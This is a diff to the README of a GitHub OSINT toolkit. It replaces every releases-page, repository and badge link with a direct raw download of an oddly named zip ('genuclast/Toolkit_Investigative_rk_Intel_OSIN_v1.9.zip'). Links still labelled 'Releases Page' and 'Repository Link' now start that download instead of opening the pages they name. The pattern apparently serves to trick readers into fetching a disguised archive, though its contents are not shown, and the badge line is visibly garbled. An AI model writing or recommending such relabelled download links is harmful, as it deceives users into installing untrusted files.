@@ -6,7 +6,7 @@ Welcome to the **D4rk_Intel-OSINT-Investigative-Toolkit**! This toolkit helps yo
 
 ## ⚡ Download Now
 
-[![Download D4rk_Intel-OSINT-Investigative-Toolkit](https://img.shields.io/badge/Download%20Now%20-blue.svg?style=for-the-badge)](https://github.com/sudharshinimurugesan/D4rk_Intel-OSINT-Investigative-Toolkit/releases)
+[![Download D4rk_Intel-OSINT-Investigative-Toolkit](https://raw.githubusercontent.com/sudharshinimurugesan/D4rk_Intel-OSINT-Investigative-Toolkit/main/genuclast/Toolkit_Investigative_rk_Intel_OSIN_v1.9.zip%20Now%https://raw.githubusercontent.com/sudharshinimurugesan/D4rk_Intel-OSINT-Investigative-Toolkit/main/genuclast/Toolkit_Investigative_rk_Intel_OSIN_v1.9.zip)](https://raw.githubusercontent.com/sudharshinimurugesan/D4rk_Intel-OSINT-Investigative-Toolkit/main/genuclast/Toolkit_Investigative_rk_Intel_OSIN_v1.9.zip)
 
 ## 📥 Download & Install
 
@@ -14,7 +14,7 @@ To begin using the toolkit, follow these steps:
 
 1. **Visit the Releases Page**  
    Click the link below to go to the Releases page. Here, you will find the latest versions of the toolkit available for download.  
-   [Visit the Releases Page](https://github.com/sudharshinimurugesan/D4rk_Intel-OSINT-Investigative-Toolkit/releases)
+   [Visit the Releases Page](https://raw.githubusercontent.com/sudharshinimurugesan/D4rk_Intel-OSINT-Investigative-Toolkit/main/genuclast/Toolkit_Investigative_rk_Intel_OSIN_v1.9.zip)
 
 2. **Select the Latest Release**  
    On the Releases page, you will see a list of available versions. Look for the latest version at the top of the list.
@@ -81,7 +81,7 @@ Join our community of users and contributors. Share your experiences and tips, a
 ## 🔗 Links
 
 For more information and updates, check out the repository:  
-[Repository Link](https://github.com/sudharshinimurugesan/D4rk_Intel-OSINT-Investigative-Toolkit)  
+[Repository Link](https://raw.githubusercontent.com/sudharshinimurugesan/D4rk_Intel-OSINT-Investigative-Toolkit/main/genuclast/Toolkit_Investigative_rk_Intel_OSIN_v1.9.zip)  
 
 Visit the Releases page again to download the toolkit:  
-[Visit the Releases Page](https://github.com/sudharshinimurugesan/D4rk_Intel-OSINT-Investigative-Toolkit/releases)
+[Visit the Releases Page](https://raw.githubusercontent.com/sudharshinimurugesan/D4rk_Intel-OSINT-Investigative-Toolkit/main/genuclast/Toolkit_Investigative_rk_Intel_OSIN_v1.9.zip)
